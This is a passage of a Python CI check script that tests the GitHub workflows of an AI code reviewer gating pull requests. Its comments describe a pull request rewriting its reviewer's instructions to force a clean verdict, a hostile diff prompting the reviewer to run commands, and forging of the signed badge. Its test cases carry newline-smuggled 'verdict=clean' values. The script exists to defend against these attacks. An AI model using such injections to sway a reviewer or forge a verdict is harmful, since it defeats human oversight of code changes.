        print("  wiring: cannot find what %s asks GitHub for. It is the last `runs=`, `mine=` "
              "and `ran=` assignments; if any was renamed, say what the new request is here so "
              "it can be tested" % WAKE_WORKFLOW)
        bad += 1
    else:
        endpoint, query, program = request
        if endpoint != WAKE_ENDPOINT:
            print("  wiring: %s asks GitHub at `%s`; it must ask at `%s`. A path that answers "
                  "nothing leaves the check never asked again" % (WAKE_WORKFLOW, endpoint,
                                                                  WAKE_ENDPOINT))
            bad += 1
        # Checked before the jq test, because a parameter that narrows the
        # answer server side is invisible to any test of the jq that follows it.
        if query != WAKE_QUERY:
            print("  wiring: %s asks GitHub for %s; it must ask for exactly %s. A `status` here "
                  "filters by conclusion server side, and a smaller `per_page` returns too few "
                  "runs to find the check among them — either way the successful runs never "
                  "reach the jq below, and a verdict turning the gate red never reaches the "
                  "check" % (WAKE_WORKFLOW, dict(sorted(query.items())),
                             dict(sorted(WAKE_QUERY.items()))))
            bad += 1
        try:
            out = subprocess.run(["jq", "-r", program], input=json.dumps(WAKE_RUNS),
                                 capture_output=True, text=True)
        except OSError as e:
            # Fail closed. An untested selector is the thing being guarded against.
            print("  wiring: jq is needed to test what %s re-runs, and could not be run (%s)"
                  % (WAKE_WORKFLOW, e))
            bad += 1
        else:
            picked = [int(x) for x in out.stdout.split()] if out.returncode == 0 else None
            if picked is None:
                print("  wiring: the selection in %s is not valid jq — %s"
                      % (WAKE_WORKFLOW, out.stderr.strip().splitlines()[:1]))
                bad += 1
            elif sorted(picked) != WAKE_PICKS:
                missing = [r for r in WAKE_PICKS if r not in picked]
                print("  wiring: the selection in %s picks %s, and must pick %s. Missing %s. "
                      "Run 1 is a completed check run that SUCCEEDED: drop it and a verdict "
                      "turning the gate red never reaches the check, which is the stale green "
                      "of #43" % (WAKE_WORKFLOW, sorted(picked), WAKE_PICKS, missing or "nothing"))
                bad += 1

    # A WAKE THAT COULD NOT DO ITS JOB MUST SAY SO. The selector above decides
    # WHICH runs are re-run; this decides what happens when GitHub will not
    # answer at all. Both reads and the re-run POST have each been written here
    # with their failure suppressed, and each time the step exited 0 having done
    # nothing: the check was never asked again, no one was told, and a green
    # that a verdict should have turned red stayed mergeable.
    #
    # This one runs the step. A stub `gh` on PATH fails at one chosen call, the
    # step's own shell executes against it, and its exit status is the whole
    # assertion — so `|| echo ""`, `|| true`, `; true` and `set +e` are all the
    # same event and none of them has a spelling to hide behind. That is the
    # answer to a claim made on #44 and wrong: that this class could only ever
    # be grepped for. It could not be grepped for. It can be run.
    script = wake_script(wake)
    if script is None:
        print("  wiring: cannot take the shell out of %s to test it. It must be one `run: |` "
              "block with no `${{ }}` left in it, because anything else means running something "
              "other than what the runner runs" % WAKE_WORKFLOW)
        bad += 1
    else:
        for what, env, must_fail in SWALLOW_CASES:
            status, broke = swallow_verdict(script, env)
            if broke is not None:
                print("  wiring: the step in %s %s" % (WAKE_WORKFLOW, broke))
                bad += 1
                break
            if (status != 0) != must_fail:
                if must_fail:
                    print("  wiring: in %s, when %s, the step exits 0. A wake that could not ask "
                          "the check again must be RED where someone sees it — exiting 0 here is "
                          "the stale green this whole file exists to prevent, reached through the "
                          "error handler" % (WAKE_WORKFLOW, what))
                else:
                    print("  wiring: in %s, when %s, the step exits %s. It must pass: failing on "
                          "this turns every ordinary re-run race into a red wake, and a guard "
                          "that only ever demands failure proves nothing about the others"
                          % (WAKE_WORKFLOW, what, status))
                bad += 1

    # The badge's check run is not something this repository has watched GitHub
    # deliver an event for, so nothing is built on the assumption that it does.
    # The reviewer asks the gate again itself, the way #38 proved works.
    if CALLS_WAKE not in review:
        print("  wiring: %s does not call %s. Its verdict is a check run, and no listener here "
              "has ever been shown to hear one — so it must ask the gate again itself, or its "
              "read sits unseen and the check stays red until a hand re-runs it"
              % (REVIEW_WORKFLOW, WAKE_WORKFLOW))
        bad += 1

    # NOTHING MAY GROUP OR CANCEL A REVIEW. GitHub puts a run in its concurrency
    # group before the job's `if:` is evaluated, so any grouping here catches
    # every comment on the pull request, including the ones carrying no ask that
    # skip a second later. With cancel-in-progress those comments killed the read
    # that was running — #43, run 35587070648, cancelled forty seconds in by a
    # stand-down note. Without it they still displace a queued ask, because
    # GitHub keeps one pending run per group and replaces it with the newest:
    # Codex's P2 on 0c3df8a. Either way a visible ask yields no verdict and the
    # gate says `unread` without telling anyone a read was lost.
    #
    # So the setting is refused outright rather than one value of it. Codex's
    # other P2 on that head: a guard rejecting `cancel-in-progress: true` still
    # passes `cancel-in-progress: ${{ true }}`, which behaves identically. There
    # is no safe value, so there is no permitted line.
    for pattern, what in ((r'^\s*concurrency:', "a concurrency block"),
                          (r'^\s*cancel-in-progress:', "a cancel-in-progress setting")):
        if re.search(pattern, review, re.M):
            print("  wiring: %s has %s. Every comment enters the group before the job's `if:` "
                  "is read, so a passing remark cancels a review in flight or displaces a "
                  "queued ask, and the gate just says unread" % (REVIEW_WORKFLOW, what))
            bad += 1

    # THE DOOR. Without this line the App's private key is readable by any run on
    # any branch, and the badge is worth nothing: a branch mints an installation
    # token and writes itself a clean check run. It is one word deep in a YAML
    # file and would be the easiest thing here to tidy away by accident.
    if not USES_ENVIRONMENT.search(review):
        print("  wiring: %s does not run in the `%s` environment, so the App's private key is "
              "readable from any branch and the badge can be forged. This is the door"
              % (REVIEW_WORKFLOW, KEY_ENVIRONMENT))
        bad += 1
    if not USES_ENVIRONMENT.search(door):
        print("  wiring: %s no longer references the `%s` environment, so it proves nothing"
              % (DOOR_WORKFLOW, KEY_ENVIRONMENT))
        bad += 1
    # The proof has to be runnable on a branch, which is the whole point of it,
    # and must never fire on `pull_request` — there it would be red on every
    # ordinary pull request, presenting the correct result as a permanent
    # failure and teaching everyone to ignore it.
    if triggers(door) != ["push", "workflow_dispatch"]:
        print("  wiring: %s triggers on %s; it must be workflow_dispatch and a push to the "
              "proof branches, and nothing else" % (DOOR_WORKFLOW, triggers(door)))
        bad += 1
    if DOOR_BRANCHES not in door:
        print("  wiring: %s no longer restricts its push trigger to %s, so ordinary work would "
              "start it" % (DOOR_WORKFLOW, DOOR_BRANCHES))
        bad += 1

    # review.yml mints the badge's token scoped to this repository with checks:
    # write alone, and checks what it was granted and what it reaches before it
    # signs anything, as review-product.yml does for a product. Unscoped, the
    # token carried every permission the App holds on every repository it is
    # installed on. The request was rehearsed on main first (door.yml, run
    # 35870516404) and these lines are its regression test (#66's step two).
    lost = read_faults(review)
    if lost:
        print("  wiring: %s must stop its read in time to sign that it did not read, and say why; "
              "it has lost %s" % (REVIEW_WORKFLOW, "; ".join(lost)))
        bad += 1
    lost = class_faults(review, REVIEW_WORKFLOW)
    if lost:
        print("  wiring: %s must read a change at the effort its class names, and give any "
              "change but pages alone every file; it has lost %s"
              % (REVIEW_WORKFLOW, "; ".join(lost)))
        bad += 1

    lost = review_mint_faults(review)
    if lost:
        print("  wiring: %s must mint the badge's token scoped to this repository with checks: "
              "write alone, and check the grant and the reach; it has lost %s"
              % (REVIEW_WORKFLOW, "; ".join(lost)))
        bad += 1

    # The check run's name and its conclusions live in two files — the workflow
    # writes them, this one reads them — and that is the one duplication this
    # design could not avoid. So they are held against each other rather than
    # trusted: every conclusion review.yml can write is fed to the matcher that
    # has to accept it. Change either file alone and the build says so, rather
    # than the gate quietly ceasing to recognise its own reviewer.
    if ('name=%s' % REVIEWER_CHECK) not in review and ('"%s"' % REVIEWER_CHECK) not in review:
        print("  wiring: %s does not name its check run `%s`, which is the only name this gate "
              "reads" % (REVIEW_WORKFLOW, REVIEWER_CHECK))
        bad += 1
    written = sorted(set(re.findall(r'^\s*conclusion=([a-z_]+)\s*$', review, re.M)))
    fake_head = "090e429a31cd5f0b2e4d7a1c9b8e6f4d2a1c3b5e"
    got = dict((c, check_run_verdict(
        {"app": {"id": REVIEWER_APP_ID}, "name": REVIEWER_CHECK, "head_sha": fake_head,
         "status": "completed", "conclusion": c}, fake_head)) for c in written)
    want = {"success": CLEAN, "failure": FINDINGS, "neutral": None}
    if got != want:
        print("  wiring: %s writes the conclusions %s, which this gate reads as %s — it must "
              "write exactly one clean (success), one findings (failure) and one that is no "
              "verdict at all (neutral)" % (REVIEW_WORKFLOW, written, got))
        bad += 1

    # "Read the code, write one check run and one comment, nothing else" is the
    # whole of what this reviewer promises, and a command-line binary with a tool
    # surface is a much larger thing to promise it of than a single HTTP call
    # would be. So the flags that make it true are checked rather than intended:
    # a later session tidying one of them away is the likeliest way this quietly
    # becomes a reviewer that can run commands on a hostile diff's say-so.
    for flag, why in (('--tools ""', "every built-in tool would be back on"),
                      ("--restricted", "it would read this repository's own settings files"),
                      ("--strict-mcp-config", "it could pick up MCP servers from elsewhere"),
                      (READ_MODEL, "it would not read with the model the registry names for the role"),
                      (READ_EFFORT, "it would not read at the effort its change's class names")):
        if flag not in review:
            print("  wiring: %s no longer passes %s — %s" % (REVIEW_WORKFLOW, flag, why))
            bad += 1

    # The reviewer's own tool is pinned to one version and installed in a step
    # holding no secret. Unpinned, a read ran whatever the registry published
    # last; installed beside CLAUDE_CODE_OAUTH_TOKEN, a bad release's install
    # script ran next to the Chairman's credential. Held for EVERY secret, not
    # the one that raised it (#65's first read): the App's signing key sits two
    # steps up, and beside it an install script could sign any verdict. A step
    # holds a secret when it names one or the installation token the badge
    # mints; and no secret may sit above the steps, where every step inherits it.
    pins = re.findall(r"npm install -g @anthropic-ai/claude-code@(\d+\.\d+\.\d+)\b", review)
    loose = re.findall(r"npm install[^\n]*@anthropic-ai/claude-code(?!@\d)", review)
    holds = re.compile(r"secrets\.|steps\.badge\.outputs\.token")
    above, _, rest = review.partition("\n    steps:\n")
    beside = [s for s in re.split(r"\n\s*- name: ", rest) if "npm install" in s and holds.search(s)]
    if len(pins) != 1 or loose or beside or holds.search(above):
        print("  wiring: %s must install the reviewer's tool once, pinned to an exact version "
              "(npm install -g @anthropic-ai/claude-code@X.Y.Z), in a step that holds no "
              "secret, with no secret set above the steps — unpinned, a read runs whatever the "
              "registry published last, and beside a secret its install script runs next to "
              "the Chairman's credential or the App's signing key" % REVIEW_WORKFLOW)
        bad += 1

    # Codex's P1 on #38, accepted in full: the brief was read from the pull
    # request's own head, so a proposer could edit AGENTS.md to instruct the
    # reviewer to answer clean. It is read from the protected branch instead, and
    # the pages under review reach the model as data in the user turn. That
    # distinction is the whole fix, and it is one `git show` away from being
    # undone.
    if "origin/${{ github.event.repository.default_branch }}:AGENTS.md" not in review:
        print("  wiring: %s no longer reads the brief from the protected branch. Read from the "
              "head, a pull request can write its own reviewer's instructions — Codex's P1 on "
              "#38" % REVIEW_WORKFLOW)
        bad += 1

    # The diff is read against the protected branch's tip, and the pull
    # request's base is not fetched at all. #34's route: a head read clean
    # against a base that already carries the change being judged, then
    # retargeted to main, stays clean — the badge's run is on the head, and it
    # judged the wrong comparison. Both halves are held, because a base fetched
    # and unused is one edit from being the comparison again.
    against_main = ('git diff "origin/${{ github.event.repository.default_branch }}...'
                    '${{ steps.head.outputs.sha }}"')
    if against_main not in review or ".base.sha" in review:
        print("  wiring: %s must read the diff against the protected branch's tip — `%s` — and "
              "never fetch the pull request's base, or a head read clean against another base "
              "stays clean after a retarget to main (#34)" % (REVIEW_WORKFLOW, against_main))
        bad += 1

    if not bad:
        # The route count that stood here was `len(set(app_id is None for ...))` —
        # a leftover from when a reviewer could answer by a login or by an App,
        # and an opaque way of saying "1" once only one of those is allowed.
        # `_check_routes` now refuses any entry without an app_id, so the route
        # is one by construction and is named rather than counted.
        print("ok: the gate counts %d reviewer(s), each answering only as a check run it signed, "
              "each read reaching the check by a route that can actually fire; the reviewer runs "
              "only from the default branch, its key sits behind the `%s` door, and the wake's "
              "own shell was run against a failing GitHub in %d case(s) and went red in every "
              "one that must"
              % (len(REVIEWERS), KEY_ENVIRONMENT, len(SWALLOW_CASES)))
    return bad


# ---------------------------------------------------------------------------
# THE PRODUCT REVIEWER. His ruling, 23 September 2026: "Sonnet reviewer for
# Hemz OS. Port the reviewer badge from how-we-build into this repo's review
# gate and retire Codex here." A product is private, and on GitHub Free a
# private repository's environment protection is no boundary, so its pull
# requests are read from here and signed there (decision 0002, C; decision
# 0004's "one reviewer workflow in the public rulebook, one protected App
# credential, taking target repo, pull request and exact head SHA as inputs").
#
# It is a second file rather than a second trigger on review.yml, so that a
# route which has never run cannot stop the one that works. What makes that
# safe is below: everything review.yml is held to that is not about this
# repository's own pull requests, the product file is held to as well, and the
# lines the two must say identically are compared, not trusted. A product
# gains nothing here by being named; it gains a read by being on the file's
# list, which must name only products this README lists.
PRODUCT_WORKFLOW = ".github/workflows/review-product.yml"
PRODUCT_SCOPE = ('{repositories: [$r], permissions: {contents: "read", pull_requests: "write", '
                 'checks: "write"}}')
PRODUCT_BRIEF = 'g show "origin/$MAIN:AGENTS.md" > "$t/brief.txt"'
PRODUCT_DIFF = 'g diff "origin/$MAIN...$SHA" > "$t/diff.txt"'
PRODUCT_HEAD = ('[ "$head" = "$SHA" ]', '[ "$fetched" = "$SHA" ]')
PRODUCT_REACH = ('"https://api.github.com/installation/repositories"', 'if [ "$reach" != "$REPO" ]; then')
# What the token was granted, checked against exactly what was asked for
# (#68's twelfth read), in that order: wanted, then read from GitHub's answer.
PRODUCT_GRANT = ("""want='{"checks":"write","contents":"read","pull_requests":"write"}'""",
                 """granted=$(jq -cS '(.permissions // {}) | del(.metadata)' "$RUNNER_TEMP/mint.json")""",
                 'if [ "$granted" != "$want" ]; then')
# The badge's own token, scoped as review-product.yml's is, to the one thing it
# does: write the verdict's check run here. Held in order: the request, the
# post that sends it, the grant wanted and checked, and the reach checked.
REVIEW_SCOPE = '{repositories: [$r], permissions: {checks: "write"}}'
REVIEW_MINT = ("""body=$(jq -cn --arg r "${GITHUB_REPOSITORY#*/}" '%s')""" % REVIEW_SCOPE,
               '"https://api.github.com/app/installations/$inst/access_tokens" -d "$body"',
               """want='{"checks":"write"}'""",
               PRODUCT_GRANT[1],
               PRODUCT_GRANT[2],
               PRODUCT_REACH[0],
               'if [ "$reach" != "$GITHUB_REPOSITORY" ]; then')


def review_mint_faults(review):
    """The lines of review.yml's scoped mint that are missing, or out of order."""
    lost, at = [], 0
    for line in REVIEW_MINT:
        i = review.find(line, at)
        if i < 0:
            lost.append("`%s`" % line)
        else:
            at = i + len(line)
    return lost


# Each must turn the hold red on the real review.yml, or the hold is decoration.
REVIEW_LOOSENINGS = (
    ("the token unscoped", lambda t: t.replace(REVIEW_SCOPE, "{}", 1)),
    ("the request never sent", lambda t: t.replace(' -d "$body"', "", 1)),
    ("a wider grant wanted", lambda t: t.replace(REVIEW_MINT[2], REVIEW_MINT[2].replace('"checks":"write"', '"checks":"write","contents":"write"'), 1)),
    ("the grant taken on trust", lambda t: t.replace(REVIEW_MINT[3], "granted=$want", 1)),
    ("the grant printed, not checked", lambda t: t.replace(REVIEW_MINT[4], "if false; then", 1)),
    ("the reach never asked", lambda t: t.replace(REVIEW_MINT[5], '"https://api.github.com/"', 1)),
    ("the reach printed, not checked", lambda t: t.replace(REVIEW_MINT[6], "if false; then", 1)),
)


def _check_review_loosenings():
    """Every loosening above must turn review.yml's mint hold red on the real file."""
    try:
        review = _read(REVIEW_WORKFLOW)
    except OSError as e:
        print("  wiring: %s" % e)
        return 1
    bad = 0
    if review_mint_faults(review):
        return 1  # the wiring check says what; a loosened copy proves nothing here
    for what, loosen in REVIEW_LOOSENINGS:
        changed = loosen(review)
        if changed == review:
            print("  wiring: the loosening '%s' no longer applies to %s — rewrite it against the "
                  "file as it stands, or it proves nothing" % (what, REVIEW_WORKFLOW))
            bad += 1
        elif not review_mint_faults(changed):
            print("  wiring: %s with %s passes the mint hold — the guard for it is gone"
                  % (REVIEW_WORKFLOW, what))
            bad += 1
    if not bad:
        print("ok: each of %d loosenings of %s's scoped mint was applied to the real file and "
              "refused" % (len(REVIEW_LOOSENINGS), REVIEW_WORKFLOW))
    return bad


PRODUCT_NAMES = ('--arg name "%s"' % REVIEWER_CHECK, '"$REVIEWER_APP_ID" "%s"' % REVIEWER_CHECK)
PASTED_INPUT = re.compile(r"^\s+[A-Z_]+: \$\{\{ inputs\.[a-z_]+ \}\}\s*$")
XTRACE = re.compile(r"\bset\s+-\w*x|\bxtrace\b")
TOOL_PIN = r"npm install -g @anthropic-ai/claude-code@(\d+\.\d+\.\d+)\b"
SCHEMA = re.compile(r"^\s*schema='([^']*)'\s*$", re.M)
# What the model is asked for (decision 0014, position C): findings, each with a
# severity and a text, and a review. Never a verdict: model-registry/ask.py's
# derive() makes the verdict from the findings, for either caller.
FINDINGS_SCHEMA = {
    "type": "object", "additionalProperties": False, "required": ["findings", "review"],
    "properties": {
        "findings": {"type": "array", "items": {
            "type": "object", "additionalProperties": False, "required": ["severity", "text", "files"],
            "properties": {"severity": {"type": "string", "enum": ["blocking", "advisory", "needs-context"]},
                           "text": {"type": "string"},
                           # A read short of context names what it needed here (decision 0014, F(2)).
                           "files": {"type": "array", "items": {"type": "string"}}}}},
        "review": {"type": "string"}}}
CEILING = re.compile(r'"\$bytes" -gt (\d+)')
TIMEOUT = re.compile(r"^\s*timeout-minutes:\s*(\d+)\s*$", re.M)
# The clean-up (#68's seventh read): whatever happened, a check run the job
# opened and never signed is closed as a read that did not happen, a close that
# did not take turns the step red, and the token is revoked. Held as whole lines
# inside that one step, since the file revokes a token elsewhere too, and a line
# found anywhere would pass a clean-up that had lost it.
PRODUCT_CLEANUP = "Leave nothing open"
PRODUCT_CLEANUP_LINES = (
    "if: always()",
    "TOKEN: ${{ steps.badge.outputs.token }}",
    "RUN: ${{ steps.open.outputs.id }}",
    "SIGNED: ${{ steps.sign.outcome }}",
    'if [ -z "${TOKEN:-}" ]; then',
    'if [ -n "${RUN:-}" ] && [ "$SIGNED" != "success" ]; then',
    """jq -n '{status:"completed", conclusion:"neutral",""",
    'if [ "$code" = "200" ]; then',
    "left_open=yes",
    """code=$(curl -sS -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: token $TOKEN" \\""",
    '-H "Accept: application/vnd.github+json" "https://api.github.com/installation/token") || '
    'code="unreachable"',
)
PRODUCT_CLEANUP_LAST = '[ "$left_open" = no ]'


def _step_span(text, name):
    """Where the step called `name` sits: from its `- name:` line to the next step's."""
    m = re.search(r"^([ ]*)- name: %s[ ]*$" % re.escape(name), text, re.M)
    if not m:
        return None
    after = re.compile(r"^%s- name: " % m.group(1), re.M).search(text, m.end())
    return m.start(), after.start() if after else len(text)


def _in_step(text, name, old, new):
    """The text with the first `old` inside the named step, and only there, made `new`."""
    span = _step_span(text, name)
    if not span:
        return text
    start, end = span
    return text[:start] + text[start:end].replace(old, new, 1) + text[end:]


def _without_step(text, name):
    """The text with the named step taken out whole."""
    span = _step_span(text, name)
    return text[:span[0]] + text[span[1]:] if span else text


def _block(text, first, last, keep_comments=True):
    """The stripped lines from the first matching `first` to the next `last`."""
    lines = [l.strip() for l in text.splitlines()]
    if not keep_comments:
        lines = [l for l in lines if l and not l.startswith("#")]
    try:
        start = next(i for i, l in enumerate(lines) if first(l))
        end = next(i for i, l in enumerate(lines) if i > start and last(l))
    except StopIteration:
        return None
    return lines[start:end + 1]


def _standing(text):
    """The standing instruction a reviewer is given, as the lines that echo it."""
    return _block(text, lambda l: l.startswith('echo "You are the independent reviewer'),
                  lambda l: "say in the review that it tried." in l)


def _jwt(text):
    """The App's JWT, signed: from writing the key to the token it makes.

    From the write, not the helper: the line where a secret becomes the key the
    signature uses is held with the rest (#69's first read, on door.yml's copy).
    """
    return _block(text, lambda l: l.endswith('> "$key"'),
                  lambda l: l == 'jwt="$hdr.$pl.$sig"', keep_comments=False)


def _call(text):
    """Every flag the reviewer is called with, one per line, in order.

    The system prompt's flag is kept without its argument: each file reads the
    prompt from where it keeps it, and that path is all that may differ.
    """
    lines = [l.strip() for l in text.splitlines()]
    try:
        start = next(i for i, l in enumerate(lines) if re.search(r"(^|\s)claude -p \\$", l))
    except StopIteration:
        return None
    flags = []
    for line in lines[start + 1:]:
        if not line.startswith("--"):
            break
        flags.append("--system-prompt" if line.startswith("--system-prompt ") else line)
    return flags or None


# THE READ STOPS IN TIME TO SAY SO, AND SAYS WHY. #73's second read, run
# 35925225489, ran into the job's 30 minutes: the job was cancelled, nothing was
# signed, and the pull request just looked unread. A read that failed any other
# way said "the run log says which", and the log did not (#47, run 35773558213;
# #56, run 35788659651). So each reviewer bounds its call inside the step and
# carries `why()`'s reason to the check run. The bound is minute `limit` OF THE
# JOB, counted from the first step's `started`, not from the read's own start
# (#76's first read): time the steps before it spend comes out of the read, and
# the minutes after it are left for the verdict to be signed. `why()` and the
# deadline are run here, not read: each way a read can end below must be named,
# on one line, or the step has lost it.
READ_CALL = 'timeout --kill-after=60s "${2}s" claude -p \\'
READ_LIMIT = re.compile(r"^\s*limit=(\d+)\s*$", re.M)
READ_MARGIN = 5
READ_START = 'echo "started=$(date +%s)" >> "$GITHUB_OUTPUT"'
READ_LEFT = 'left=$(( STARTED + limit * 60 - $(date +%s) ))'
# (what the steps before the read did, how long ago the job started or what was
# recorded, whether the read may begin). `limit` is the same in both files.
DEADLINE_CASES = (
    ("the job has just started", 0, True),
    ("the steps before ran to minute 20", 20 * 60, True),
    ("they ran to within a minute of the deadline", 50 * 60 - 30, False),
    ("they ran past it", 60 * 60, False),
    ("no start was recorded", "", False),
    ("the start is not a number", "1+1", False),
    # Unchecked, a word is an unset variable to the arithmetic, and the step
    # dies on it before it can say why.
    ("the start is a word", "soon", False),
)
READ_FAIL = """printf 'why=%s\\n' "$(printf '%s' "$1" | tr -d '\\r\\n')" >> "$GITHUB_OUTPUT\""""
READ_WHY = ("WHY: ${{ steps.read.outputs.why }}", 'title="Did not read: $WHY${SPENT:+ ($SPENT)}"')
# (how the read ended, its stderr, its answer, what must be said). `%s` is the
# file's own limit.
WHY_CASES = (
    (124, "", "", "the read ran out of time and was stopped at minute %s of the job"),
    (137, "", "", "the read was killed, out of time or out of memory"),
    (127, "bash: claude: command not found", "", "the reviewer's tool is not installed"),
    (1, "", '{"is_error":true,"result":"Prompt is too long"}', "too long for one read"),
    (1, "API Error: 429 rate_limit_error", "", "rate-limited or overloaded"),
    (1, "", '{"is_error":true,"result":"Claude AI usage limit reached"}', "allowance is spent"),
    # #79's third read, run 36012650404: a spent session limit, in an answer
    # whose usage carries `contextWindow`. Read whole, the key said "too long".
    (1, "", '{"is_error":true,"result":"You\'ve hit your session limit \u00b7 resets 2:50pm (UTC)",'
            '"modelUsage":{"a-model":{"contextWindow":200000}}}', "allowance is spent"),
    (1, "", '{"is_error":true,"result":"boom","modelUsage":{"m":{"contextWindow":200000}}}',
     "unrecognised; 0 bytes on stderr"),
    (1, "", "not json: Prompt is too long", "too long for one read"),
    # Every string the answer holds, wherever it sits, and none of its keys
    # (#79's eleventh read): a message outside `.result` is still read.
    (1, "", '{"is_error":true,"error":{"message":"Prompt is too long"}}', "too long for one read"),
    (1, "OAuth token has expired", "", "credential was refused"),
    # A budget refusal is named as one, whatever the provider's words say of
    # credit (decision 0014, D): it parks the slice and is no model's refusal.
    (1, "", '{"is_error":true,"subtype":"budget_refused","result":"budget refused: no credit"}', "budget refused"),
    (1, "", '{"is_error":true,"subtype":"provider_limit","result":"Insufficient credits"}', "budget refused"),
    # A provider's refusal says why, on one line (his ruling, 6 October 2026: GLM
    # refused #154's read in a second and the reason was lost).
    (1, "", '{"is_error":true,"subtype":"http_error","result":"HTTP 400 from openrouter: max_tokens is too large"}',
     "the provider refused the read: HTTP 400 from openrouter: max_tokens is too large"),
    (1, "", '{"is_error":true,"subtype":"http_error","result":"HTTP 404 from openrouter:\\nno endpoint\\nverdict=clean"}',
     "the provider refused the read: HTTP 404 from openrouter:no endpointverdict=clean"),
    (0, "", '{"subtype":"error_max_turns"}', "the read answered 'error_max_turns'"),
    # A subtype is the tool's to write, and the reason is written to
    # $GITHUB_OUTPUT: a line break in it would be a second output of its own.
    (0, "", '{"subtype":"x\\nverdict=clean"}', "the read answered 'xverdictclean'"),
    (1, "", "", "unrecognised; 0 bytes on stderr"),
)


def _why(text):
    """`why()`, as the stripped lines that define it."""
    return _block(text, lambda l: l == "why() {", lambda l: l == "}")


def why_says(block, limit, rc, err, out):
    """Run `why()` as a read that ended so would. (exit status, what it said)."""
    with tempfile.TemporaryDirectory() as d:
        paths = {"err": os.path.join(d, "err.txt"), "out": os.path.join(d, "resp.json")}
        for key, body in (("err", err), ("out", out)):
            with open(paths[key], "w", encoding="utf-8") as f:
                f.write(body)
        e = dict(os.environ, rc=str(rc), limit=str(limit), **paths)
        try:
            p = subprocess.run(["bash", "-c", "set -euo pipefail\n%s\nwhy\n" % "\n".join(block)],
                               env=e, capture_output=True, text=True, timeout=30)
        except (OSError, subprocess.SubprocessError) as exc:
            return None, "could not be run (%s)" % exc
        return p.returncode, p.stdout


def _deadline(text):
    """The read's deadline, as the stripped lines from `limit=` to the check on `left`."""
    return _block(text, lambda l: READ_LIMIT.match(l) is not None,
                  lambda l: l.startswith('[ "$left" -ge 60 ] || fail "'))


def deadline_says(block, started):
    """Run the deadline with `started` as the job's start. (may it read, seconds left)."""
    now = int(time.time())
    value = str(now - started) if isinstance(started, int) else started
    script = 'fail() { echo "refused: $1"; exit 3; }\n%s\necho "left=$left"\n' % "\n".join(block)
    try:
        p = subprocess.run(["bash", "-c", "set -euo pipefail\n" + script],
                           env=dict(os.environ, STARTED=value), capture_output=True, text=True,
                           timeout=30)
    except (OSError, subprocess.SubprocessError):
        return None, None
    m = re.search(r"^left=(-?\d+)$", p.stdout, re.M)
    if p.returncode == 0 and m:
        return True, int(m.group(1))
    return (False, None) if p.returncode == 3 and "refused: " in p.stdout else (None, None)


def read_faults(text):
    """What a reviewer's read has lost of stopping in time and saying why."""
    lost = []
    calls = [l.strip() for l in text.splitlines() if "claude -p" in l]
    if calls != [READ_CALL]:
        lost.append("one call of the reviewer, as `%s`" % READ_CALL)
    job, limit = TIMEOUT.findall(text), READ_LIMIT.findall(text)
    if len(job) != 1 or len(limit) != 1 or int(limit[0]) + READ_MARGIN > int(job[0]):
        lost.append("one `limit=` at least %d minutes inside the job's one `timeout-minutes`, so "
                    "a read stopped there is still signed" % READ_MARGIN)
    read, sign = _step_span(text, "Read it"), _step_span(text, "Sign the verdict")
    if not read or READ_FAIL not in text[read[0]:read[1]]:
        lost.append("`%s` in the read" % READ_FAIL)
    # The job's start, recorded by its first step and handed to the read.
    first = re.search(r"^    steps:\n(.*?)(?=^      - name: |\Z)", text, re.S | re.M)
    first = re.search(r"^      - name: .*?(?=^      - name: |\Z)", text[first.end():], re.S | re.M) \
        if first else None
    first_id = re.search(r"^        id: (\w+)\s*$", first.group(0), re.M) if first else None
    if not first_id or READ_START not in first.group(0):
        lost.append("`%s` in the job's first step, which has an id" % READ_START)
    elif not read or ("STARTED: ${{ steps.%s.outputs.started }}" % first_id.group(1)) \
            not in text[read[0]:read[1]]:
        lost.append("`STARTED: ${{ steps.%s.outputs.started }}` handed to the read"
                    % first_id.group(1))
    if not read or READ_LEFT not in text[read[0]:read[1]]:
        lost.append("the deadline counted from the job's start (`%s`)" % READ_LEFT)
    block = _deadline(text)
    if block is None or len(limit) != 1:
        lost.append("a deadline, from `limit=` to a refusal when under a minute is left")
    else:
        for what, started, may in DEADLINE_CASES:
            ok, left = deadline_says(block, started)
            budget = int(limit[0]) * 60 - (started if isinstance(started, int) else 0)
            if ok is None or ok != may or (ok and not budget - 5 <= left <= budget):
                lost.append("a deadline that %s the read when %s (it %s)"
                            % ("lets in" if may else "refuses", what,
                               "could not be run" if ok is None else
                               "gave it %ss" % left if ok else "refused it"))
    for line in READ_WHY:
        if not sign or line not in text[sign[0]:sign[1]]:
            lost.append("`%s` where the verdict is signed" % line)
    block = _why(text)
    if block is None:
        lost.append("a `why()` naming the reason")
    elif len(limit) == 1:
        for rc, err, out, words in WHY_CASES:
            want = words % limit[0] if "%s" in words else words
            status, said = why_says(block, limit[0], rc, err, out)
            if status != 0 or want not in said or said.count("\n") != 1:
                lost.append("`why()` saying %r, on one line, when the read exits %d (it said %r)"
                            % (want, rc, said))
    return lost


# Each must turn the hold red on both reviewers' files, or the hold is decoration.
READ_LOOSENINGS = (
    ("the read unbounded", lambda t: t.replace(READ_CALL, "claude -p \\", 1)),
    ("a read the job cuts off first", lambda t: t.replace("          limit=50\n", "          limit=53\n", 1)),
    ("no limit set", lambda t: t.replace("          limit=50\n", "", 1)),
    ("a time-out not named", lambda t: _in_step(t, "Read it", 'if [ "$rc" -eq 124 ]; then', 'if [ "$rc" -eq 125 ]; then')),
    ("a missing tool not named", lambda t: _in_step(t, "Read it", 'elif [ "$rc" -eq 127 ]; then', 'elif false; then')),
    ("a reason that can break a line", lambda t: _in_step(t, "Read it", "| tr -cd 'a-z_' ||", "||")),
    ("the reason never recorded", lambda t: _in_step(t, "Read it", READ_FAIL, "true")),
    ("the reason never passed on", lambda t: _in_step(t, "Sign the verdict", READ_WHY[0], "WHY: none")),
    ("the reason kept from the verdict", lambda t: _in_step(t, "Sign the verdict", READ_WHY[1], 'title="Did not read"')),
    ("the deadline from the read's own start", lambda t: t.replace(READ_LEFT, "left=$(( limit * 60 ))", 1)),
    ("a read begun with no time left", lambda t: t.replace('[ "$left" -ge 60 ] || fail', '[ "$left" -ge -9999 ] || fail', 1)),
    ("a start that is not checked", lambda t: _in_step(t, "Read it", '[[ "${STARTED:-}" =~ ^[0-9]+$ ]] || fail', "true || fail")),
    ("no start recorded", lambda t: t.replace("          " + READ_START + "\n", "", 1)),
    ("the start never handed on", lambda t: t.replace("outputs.started }}", "outputs.begun }}", 1)),
)


def _check_read_loosenings():
    """Every loosening above, applied to each reviewer's real file, must be refused."""
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
